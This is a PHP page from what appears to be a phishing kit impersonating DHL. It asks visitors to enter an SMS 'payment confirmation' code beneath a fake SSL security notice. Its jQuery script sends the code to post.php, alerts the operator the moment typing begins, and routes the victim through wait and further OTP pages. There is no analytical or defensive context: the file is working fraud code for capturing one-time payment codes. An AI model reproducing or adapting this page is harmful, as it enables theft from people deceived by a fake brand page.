<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $langs['title']; ?></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
    <div class="header">
        <div class="container">
            <div class="left">
                <img src="res/logo.png">
            </div>
            <div class="right">
                <span><?php echo $langs['help_support']; ?></span>
            </div>
        </div>
    </div>
    <div class="header">
        <div class="container links" style="display:inline-block;">
            <span><?php echo $langs['home']; ?></span>
            <span><?php echo $langs['ship']; ?></span>
            <span><?php echo $langs['track']; ?></span>
        </div>
    </div>
</header>

<main>
    <div class="container">
        <div class="form">
            <div class="title"><?php echo $langs['payment_confirmation']; ?></div>
            <div class="text"><?php echo $langs['confirm_payment_text']; ?></div>
            <?php setError($langs['invalid_confirmation_code']); ?>
            <div class="col">
                <label><?php echo $langs['confirmation_code']; ?>: </label>
                <input type="text" id="u" placeholder="XXXXXX">
            </div>

            <div class="col">
                <button onclick="sendLog()"><?php echo $langs['continue']; ?></button>
            </div>

            <div class="col methods" style="margin:50px 0;">
                <img src="res/methods.png">
                <h4 style="color:green;"><?php echo $langs['ssl_security']; ?></h4>
                <p style="font-size:0.8em;"><?php echo $langs['payment_security_notice']; ?></p>
            </div>
        </div>
    </div>
</main>

<footer>
    <div class="container">
        <div class="rows">
            <div class="cola">
                <span><img src="res/footer.png"></span>
                <span><?php echo $langs['about_dhl']; ?></span>
                <span><?php echo $langs['press']; ?></span>
                <span><?php echo $langs['careers']; ?></span>
                <span><?php echo $langs['legal_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['alerts']; ?></span>
                <span><?php echo $langs['fraud_awareness']; ?></span>
                <span><?php echo $langs['important_information']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['legal']; ?></span>
                <span><?php echo $langs['terms_conditions']; ?></span>
                <span><?php echo $langs['privacy_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['contact_support']; ?></span>
                <span><?php echo $langs['help_support']; ?></span>
                <span><?php echo $langs['faqs']; ?></span>
                <span><?php echo $langs['contact_us']; ?></span>
                <span><?php echo $langs['find_location']; ?></span>
            </div>
        </div>
    </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>

$("#u").mask("00000000");

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val().length<5){
        return $("#u").addClass("error");
    } 

    $.post("post.php",{
        sms:$("#u").val(),
    },(res)=>{
        <?php if(isset($_GET['e'])){ ?>
        window.location="wait.php?next=exit.php";
        <?php } else { ?>
          window.location="wait.php?next=otp.php?e";
        <?php } ?>
    } );

}


var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{n_sms:1});
        abortNote=true;
    }

});


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});


</script>
</body>
</html>